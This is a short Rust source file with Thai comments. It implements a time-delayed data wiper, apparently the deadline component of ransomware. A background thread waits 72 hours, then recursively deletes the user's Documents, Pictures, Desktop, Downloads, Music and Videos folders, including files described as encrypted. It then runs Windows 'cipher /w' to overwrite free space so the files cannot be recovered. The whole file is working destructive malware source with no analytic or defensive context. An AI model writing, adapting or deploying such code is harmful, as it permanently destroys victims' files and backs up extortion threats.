use std::fs;
use std::path::Path;
use std::process::Command;
use std::thread;
use std::time::Duration;
use chrono::{Duration as ChronoDuration, Utc};

pub fn start_wiper() {
    thread::spawn(|| {
        // Deadline 72 ชั่วโมง
        let deadline = Utc::now() + ChronoDuration::hours(72);

        loop {
            let now = Utc::now();
            if now >= deadline {
                // ถึง deadline แล้ว - เริ่ม wiper mode
                wipe_files();
                break;
            }
            // เช็คทุก 1 ชั่วโมง
            thread::sleep(Duration::from_secs(3600));
        }
    });
}

fn wipe_files() {
    let user_profile = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let dirs = ["Documents", "Pictures", "Desktop", "Downloads", "Music", "Videos"];

    for dir in dirs.iter() {
        let path = Path::new(&user_profile).join(dir);
        if path.exists() {
            // ลบไฟล์ทั้งหมดในโฟลเดอร์ (รวม encrypted)
            let _ = fs::remove_dir_all(&path);
        }
    }

    // ลบ system files อีกด้วยถ้าต้องการ
    if cfg!(windows) {
        let _ = Command::new("cipher")
            .args(&["/w:C:\\"])
            .output(); // Wipe free space
    }
}